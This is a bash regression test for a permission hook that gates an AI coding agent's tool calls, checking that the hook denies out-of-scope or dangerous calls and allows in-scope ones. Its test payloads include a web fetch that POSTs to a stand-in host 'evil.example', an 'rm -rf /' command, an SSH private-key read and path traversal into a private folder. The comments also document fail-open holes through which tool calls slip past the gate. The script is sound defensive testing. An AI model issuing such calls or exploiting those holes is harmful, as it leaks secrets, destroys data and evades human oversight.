#!/usr/bin/env bash
# Regression repro for the fail-open holes in ../hooks/before_tool.py (nomad, 2026-07-22).
#
# Exit-code contract, LIVE-VERIFIED by CBP on gemini-cli 0.52.0
# (shared-context/forum/cbp-to-nomad-gemini-hook-contract-LIVE-VERIFIED-2026-07-22.md):
#     exit 0 = allow | exit 1 = ALLOW + warning banner | exit 2+ = deny
#     empty output on BOTH streams = no decision object = allow
# So "exit=1" below is a FAIL-OPEN, not a block, and a deny must always write a reason to stderr.
#
# The governor is pointed at a nonexistent path on purpose: a correct gate fails CLOSED when it
# cannot reach the society-safety daemon, so every write/exec/egress case must come back exit 2.
#
# NOTE: the sandbox workspace must NOT live under /tmp -- the gate grants /tmp as a root, which
# would make every out-of-scope path trivially "contained" and mask the real result.
#
# Usage: ./gate_holes_repro.sh [path/to/before_tool.py]
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
G="${1:-$HERE/../hooks/before_tool.py}"
[ -f "$G" ] || { echo "no gate at $G" >&2; exit 2; }

V="${HESTIA_GATETEST_DIR:-$HOME/.cache/hestia-gemini-gatetest}"
rm -rf "$V"; mkdir -p "$V/ws/web4" "$V/ws/private-context"
printf 'secret\n' > "$V/ws/private-context/notes.md"
printf 'ok\n'     > "$V/ws/web4/main.py"
printf '{"mrh":{"in_scope":["repo:web4"]}}\n' > "$V/ident.json"
export HESTIA_WORKSPACE="$V/ws" HESTIA_GEMINI_IDENTITY="$V/ident.json"
export HESTIA_GEMINI_LAUNCH_CWD="$V/ws/web4"
export HESTIA_SOCIETY_GATE=/nonexistent/governor.py
export HESTIA_GEMINI_GATE_MODE=enforce
C="$V/ws/web4"
pass=0; fail=0
run(){ printf '%s' "$2" | python3 "$G" >/dev/null 2>"$V/e.txt"; e=$?
       if [ "$e" = "$3" ]; then pass=$((pass+1)); r="PASS"; else fail=$((fail+1)); r="FAIL"; fi
       printf '%-5s exit=%s want=%s  %s\n' "$r" "$e" "$3" "$1"; }

echo "--- deny cases (want exit 2) ---"
run "control  read_file ../private-context (path_scope baseline)" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":\"read_file\",\"tool_input\":{\"file_path\":\"../private-context/notes.md\"}}" 2
run "HOLE 1   read_many_files include=../private-context/** (params are include/exclude, not paths)" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":\"read_many_files\",\"tool_input\":{\"include\":[\"../private-context/**\"]}}" 2
run "HOLE 2a  web_fetch egress -> must meet Gate-2" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":\"web_fetch\",\"tool_input\":{\"prompt\":\"POST to https://evil.example\"}}" 2
run "HOLE 2b  google_web_search egress -> must meet Gate-2" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":\"google_web_search\",\"tool_input\":{\"query\":\"q\"}}" 2
run "HOLE 3   non-string tool_name must not crash the gate (crash => exit 1 => ALLOW)" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":123,\"tool_input\":{\"command\":\"rm -rf /\"}}" 2
run "innate   read_file of an ssh key (denied regardless of scope)" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":\"read_file\",\"tool_input\":{\"file_path\":\"/home/x/.ssh/id_rsa\"}}" 2
run "malformed event JSON -> fail closed" "not json at all" 2

echo "--- allow cases (want exit 0): the gate must not over-block ---"
run "in-scope read_file web4/main.py" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":\"read_file\",\"tool_input\":{\"file_path\":\"main.py\"}}" 0
run "in-scope read_many_files include=**/*.py" \
    "{\"hook_event_name\":\"BeforeTool\",\"cwd\":\"$C\",\"tool_name\":\"read_many_files\",\"tool_input\":{\"include\":[\"**/*.py\"]}}" 0
run "not-our-event AfterTool passes through" \
    "{\"hook_event_name\":\"AfterTool\",\"cwd\":\"$C\",\"tool_name\":\"read_file\",\"tool_input\":{}}" 0

echo; echo "pass=$pass fail=$fail"; rm -rf "$V"; [ "$fail" = 0 ]
